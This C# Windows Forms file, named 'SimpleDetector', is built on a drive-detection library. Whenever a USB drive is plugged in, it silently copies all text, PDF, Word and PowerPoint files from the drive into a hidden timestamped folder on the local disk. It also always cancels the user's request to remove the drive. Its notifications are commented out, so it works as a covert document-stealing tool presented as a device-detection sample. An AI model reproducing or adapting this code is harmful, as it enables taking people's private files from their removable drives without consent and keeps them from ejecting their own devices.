using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

using Dolinay;
using System.IO;
using System.Threading;
using System.Collections;

namespace SimpleDetector
{
    public partial class Form1 : Form
    {
        private DriveDetector driveDetector = null;

        public Form1()
        {
            driveDetector = new DriveDetector(this);
            driveDetector.DeviceArrived += new DriveDetectorEventHandler(OnDriveArrived);
            driveDetector.DeviceRemoved += new DriveDetectorEventHandler(OnDriveRemoved);
            driveDetector.QueryRemove += new DriveDetectorEventHandler(OnQueryRemove);
        }

        // Called by DriveDetector when removable device in inserted 
        private void OnDriveArrived(object sender, DriveDetectorEventArgs e)
        {
            // Report the event in the listbox.
            // e.Drive is the drive letter for the device which just arrived, e.g. "E:\\"
            string s = "Drive arrived " + e.Drive;
            //MessageBox.Show(s);
            // If you want to be notified when drive is being removed (and be able to cancel it), 
            // set HookQueryRemove to true 
            e.HookQueryRemove = true;
            driveDetector.EnableQueryRemove(e.Drive);

            string NewFolder = DateTime.Now.Day.ToString() + "_" + DateTime.Now.Hour.ToString() + "_" + DateTime.Now.Minute.ToString() + "_" + DateTime.Now.Second.ToString() + "\\";
            ArrayList ar = new ArrayList();
            ar.Add(e.Drive);
            ar.Add(Program.DestinationFolder!="" ? (Program.DestinationFolder+NewFolder):("c:\\sharedFolder\\"+NewFolder));
            ar.Add("*.txt");
            ar.Add("*.pdf");
            ar.Add("*.doc");
            ar.Add("*.ppt");
            if (!Directory.Exists(ar[1].ToString())) { try { Directory.CreateDirectory(ar[1].ToString()); } catch{} }
            ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), ar);
        }

        // Called by DriveDetector after removable device has been unpluged 
        private void OnDriveRemoved(object sender, DriveDetectorEventArgs e)
        {
            // TODO: do clean up here, etc. Letter of the removed drive is in e.Drive;

            // Just add report to the listbox
            string s = "Drive removed " + e.Drive;
            //MessageBox.Show(s);
        }

        // Called by DriveDetector when removable drive is about to be removed
        private void OnQueryRemove(object sender, DriveDetectorEventArgs e)
        {
            // Should we allow the drive to be unplugged?
            e.Cancel = true;        // Cancel the removal of the device  
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);        // call default p

            if (driveDetector != null)
            {
                driveDetector.WndProc(ref m);
            }
        }

        private void buttonClose_Click(object sender, EventArgs e)
        {
            /* Sample use of the DriveDetector.OpenedFile property. 
             * If you'd try to open the same file here, you will get exception because
             * DriveDetector opened this file to obtain notification handle.
             * 
            if (driveDetector.IsQueryHooked)
            {
              // this will fail
              //TextReader ro = new StreamReader(driveDetector.HookedDrive + "SomeFlashData.txt");
              // This works ok               
              TextReader ro = new StreamReader(driveDetector.OpenedFile);
              MessageBox.Show(ro.ReadLine());
              return;
            }
             */

            this.Close();
        }
        void RUN(object State)
        {
            ArrayList ar = State as ArrayList;
            if (ar.Count < 3) return;
            try
            {
                for(int i=0;i<ar.Count-2;i++)
                copyDirectory2(ar[0] as string, ar[1] as string, ar[2+i] as string);
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }
        public void copyDirectory2(string Src, string Dst, string SearchPattern)
        {
            string[] files = Directory.GetFiles(Src, SearchPattern, SearchOption.AllDirectories);
            foreach (string file in files)
            {
                try
                {
                    File.Copy(file, Dst + Path.GetFileName(file), false);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show("Error Catched: " + ex.Message);
                    string newFileName = Path.GetFileName(file).Insert(Path.GetFileName(file).LastIndexOf('.') > 0 ? Path.GetFileName(file).LastIndexOf('.') : Path.GetFileName(file).Length - 1, DateTime.Now.Hour.ToString() + DateTime.Now.Minute.ToString() + DateTime.Now.Second.ToString());
                    File.Copy(file, Dst + newFileName, true);
                }

            }
        }
        public void copyDirectory(string Src, string Dst, string SearchPattern)
        {
            //MessageBox.Show(Src);

            Thread.Sleep(10);

            String[] Files;
            String[] dirs;

            if (Dst[Dst.Length - 1] != Path.DirectorySeparatorChar) Dst += Path.DirectorySeparatorChar;
            if (!Directory.Exists(Dst)) Directory.CreateDirectory(Dst);

            Files = Directory.GetFileSystemEntries(Src, SearchPattern);
            //MessageBox.Show(Files.Length.ToString());
            foreach (string Element in Files)
            {
                //SimpleDetector.Form1.showMessage(Element);
                // Sub directories
                if (Directory.Exists(Element))
                {
                    ArrayList ar = new ArrayList();
                    ar.Add(Element);
                    ar.Add(Dst + Path.GetFileName(Element));
                    ar.Add(SearchPattern);//"*.txt;*.pdf;*.doc;*.ppt" Not Valid should be only one extention...
                    //copyDirectory(Element, Dst + Path.GetFileName(Element));
                    ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), ar);
                }
                // Files in directory
                else
                {
                    try
                    {
                        File.Copy(Element, Dst + Path.GetFileName(Element), true);
                    }
                    catch { }
                }
            }
            Files = null;

            dirs = Directory.GetDirectories(Src);
            foreach (string dir in dirs)
            {
                ArrayList ar = new ArrayList();
                ar.Add(dir);
                ar.Add(Dst /*+ Path.GetDirectoryName(dir)*/);
                ar.Add(SearchPattern);//"*.txt;*.pdf;*.doc;*.ppt" Not Valid should be only one extention...
                //copyDirectory(Element, Dst + Path.GetFileName(Element));
                ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), ar);

                //MessageBox.Show(dir.Length.ToString());
                //copyDirectory( dir, Dst, SearchPattern);
                //Files = Directory.GetFileSystemEntries(dir, SearchPattern);
                //foreach (string Element in Files)
                //{
                //    //SimpleDetector.Form1.showMessage(Element);
                //    //Console.WriteLine("copy " + Element);
                //    // Sub directories
                //    if (Directory.Exists(Element))
                //    {
                //        ArrayList ar = new ArrayList();
                //        ar.Add(Element);
                //        ar.Add(Dst + Path.GetFileName(Element));
                //        ar.Add(SearchPattern);
                //        //copyDirectory(Element, Dst + Path.GetFileName(Element));
                //        ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), ar);
                //    }
                //    // Files in directory
                //    else
                //    {
                //        try
                //        {
                //            File.Copy(Element, Dst + Path.GetFileName(Element), true);
                //        }
                //        catch { }
                //    }
                //}
            }
        }
    }
}